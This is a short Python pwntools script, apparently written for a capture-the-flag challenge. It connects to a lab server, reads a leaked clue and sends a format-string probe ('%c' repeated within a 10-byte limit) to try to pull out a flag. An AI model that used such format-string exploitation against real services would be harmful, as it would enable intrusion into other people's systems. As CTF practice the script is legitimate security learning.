#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'

r = remote("pwn-zoroblindpath.hackena-labs.com", 443, ssl=True)

r.recvuntil(b"Clue: ")
leak = r.recvline().strip()
log.info(f"Leaked: {leak}")

r.recvuntil(b"Write your path:")

# First input: use minimal %c to pass validator
payload1 = b"FIRST"
r.sendline(payload1)

r.recvuntil(b"Wrong path... try again:")
log.info("Got to second input!")

# Second input: this is 10 bytes that go to RSP and get printf'd
# We can use format strings here! But only 10 bytes
# %c works, so let's try "%c" repeated
payload2 = b"%c" * 3  # 6 bytes, safe
r.sendline(payload2)

response = r.recvall(timeout=2)
log.info(f"Second response: {response}")

if b"0xL4ugh{" in response:
    idx = response.find(b"0xL4ugh{")
    end = response.find(b"}", idx)
    if end > idx:
        log.success(f"\n*** FLAG: {response[idx:end+1].decode()} ***\n")

r.close()
